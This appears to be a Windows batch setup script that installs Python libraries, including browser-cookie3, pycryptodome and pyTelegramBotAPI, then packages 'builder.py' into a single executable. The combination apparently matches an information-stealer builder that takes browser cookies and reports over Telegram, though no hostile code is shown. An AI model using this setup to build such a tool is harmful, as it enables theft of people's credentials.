@echo off
pip install pycryptodome browser-cookie3 pillow psutil pyTelegramBotAPI requests gputil
pip install pywin32 pypiwin32
pyinstaller --onefile builder.py
pause
